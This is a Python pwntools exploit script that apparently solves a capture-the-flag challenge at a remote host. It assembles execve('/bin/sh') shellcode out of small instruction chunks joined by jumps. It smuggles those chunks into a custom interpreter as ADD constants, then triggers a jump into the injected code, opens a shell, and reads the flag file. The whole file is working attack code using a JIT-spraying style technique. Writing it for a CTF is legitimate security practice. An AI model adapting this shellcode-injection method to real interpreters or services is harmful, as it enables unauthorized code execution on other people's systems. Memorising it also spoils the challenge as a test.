#!/usr/bin/env python3

from pwn import ELF, asm, context, gdb, process, remote, u64


context.terminal = ['alacritty', '-e', 'bash', '-c']
context.arch = 'amd64'

LOCAL = False
DEBUG = False

HOST = "jmi.chal.hackthe.vote"
PORT = 1337

insns = [
    asm('xor rbx, rbx'),
    asm('xor rax, rax'),

    asm(f'mov al, {ord("h")}'),
    asm('add rbx, rax'),
    asm('shl rbx, 8'),

    asm(f'mov al, {ord("s")}'),
    asm('add rbx, rax'),
    asm('shl rbx, 8'),

    asm(f'mov al, {ord("/")}'),
    asm('add rbx, rax'),
    asm('shl rbx, 8'),

    asm(f'mov al, {ord("n")}'),
    asm('add rbx, rax'),
    asm('shl rbx, 8'),

    asm(f'mov al, {ord("i")}'),
    asm('add rbx, rax'),
    asm('shl rbx, 8'),

    asm(f'mov al, {ord("b")}'),
    asm('add rbx, rax'),
    asm('shl rbx, 8'),

    asm(f'mov al, {ord("/")}'),
    asm('add rbx, rax'),

    asm('push rbx'),
    asm('mov rdi, rsp'),
    asm('xor rax, rax'),
    asm('mov al, 0x3b'),
    asm('xor rsi, rsi'),
    asm('xor rdx, rdx'),
    asm('syscall'),
]

assert not any(len(i) > 6 for i in insns)


instructions_encoded = [i.rjust(6, b'\x90') + asm('jmp $+59') for i in insns]


trampoline = asm('jmp $+59').rjust(8, b'\x90') # Jump to first chunk of code

reg_value = sum(u64(i) for i in instructions_encoded) + u64(trampoline)
reg_value_to_add = (2**64) - (reg_value % (2**64))


# first instruction is a trampoline to the chain
script = [f"ADD {u64(trampoline)}"] + [f"ADD {u64(i)}" for i in instructions_encoded] + [
    # make register % UINT64_MAX == 0
    f"ADD {reg_value_to_add}",
    "IF",
    #"TIMES 33038209 ADD 1",
    #f"TIMES {33038208 - len(instructions_encoded)} ADD 1", # Decrement this by one for every op we need to add

    "TIMES 33 TIMES 10 TIMES 10 TIMES 10 TIMES 10 TIMES 10 TIMES 10 ADD 1", # 33000000
    "TIMES 38 TIMES 10 TIMES 10 TIMES 10 ADD 1", # 38000
    "TIMES 21 TIMES 10 ADD 1", # 210

    "TIMES 33 TIMES 10 TIMES 10 TIMES 10 TIMES 10 TIMES 10 TIMES 10 ADD 1", # 33000000
    "TIMES 38 TIMES 10 TIMES 10 TIMES 10 ADD 1", # 38000
    "TIMES 11 TIMES 10 ADD 1", # 110

    f"TIMES {97 - len(instructions_encoded)} ADD 1",
    "ENDIF",
    "PRINT",
]


gdbscript = '''
c
'''


if LOCAL:
    exe = ELF('../../../handout/handout/challenge')
    context.binary = exe
    if DEBUG:
        r = gdb.debug([exe.path], gdbscript=gdbscript)
    else:
        r = process([exe.path])
else:
    r = remote(HOST, PORT)

r.sendlineafter(b'Code: ', '\n'.join(script).encode())

r.sendline(b'cat /flag')

r.interactive()
